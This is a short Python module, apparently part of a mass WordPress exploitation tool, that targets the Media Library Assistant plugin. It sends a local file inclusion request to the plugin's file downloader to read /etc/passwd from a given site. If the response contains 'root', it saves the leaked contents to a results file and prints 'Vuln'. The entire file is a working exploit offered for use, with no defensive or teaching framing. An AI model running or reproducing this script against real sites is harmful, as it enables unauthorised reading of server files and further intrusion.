import requests
from Exploits.colors import *

def Media(url):
    test = requests.get(url+"/wp-content/plugins/media-library-assistant/includes/mla-file-downloader.php?mla_download_type=text/html&mla_download_file=/etc/passwd", timeout=5)
    if test.status_code == 200:
        if "root" in test.text:
            filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
            with open(filename, "a+") as f:
                f.write("Exploit: "+test.url + '\n' + test.text + '\n')
            print(f"{PURPLE} [ {GREEN}$ {PURPLE}]{RESET} Media Library LFI {PURPLE}=> {GREEN}Vuln {RESET}results saved to {GREEN}{filename}")
    else:
        print(f"{PURPLE} [ {GREEN}! {PURPLE}]{RESET} Media Library LFI {PURPLE}=> {RED}Not Vuln")